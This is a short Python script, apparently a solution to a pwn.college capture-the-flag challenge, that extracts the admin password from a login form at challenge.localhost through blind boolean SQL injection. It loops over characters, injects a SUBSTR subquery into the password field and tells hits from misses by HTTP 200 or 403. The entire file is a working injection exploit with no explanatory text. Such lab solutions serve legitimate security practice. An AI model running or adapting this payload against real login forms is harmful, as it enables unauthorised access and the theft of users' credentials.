import requests

URL="http://challenge.localhost"

def check_conncetion():
    response = requests.get(URL)
    if response.status_code==200:
        print("Connected successfully")
    else:
        print("Failed to connect")

def flag_exfiltration():
    res = "pwn.college{"
    index = 13
    n = 32
    while True:
        char = chr(n)
        flag = f"{res}"+f"{char}"
        sqli_payload = f"0' OR (SELECT SUBSTR(password, {index}, 1) FROM users WHERE username='admin')='{char}' -- "
        payload={
            "username": "admin",
            "password": sqli_payload
        }
        test=requests.post(URL, data=payload)
        if test.status_code == 200 and char != "}":
            res = flag
            index += 1
            n=32
        elif test.status_code == 200 and char == "}":
            res = flag
            break
        elif test.status_code == 403:
            n +=1
        else:
            print("Error: "+f"{test.status_code}\nPayload: {sqli_payload}")
            break
    return res

if __name__=="__main__":
    check_conncetion()
    res = flag_exfiltration()
    print(f"{res}")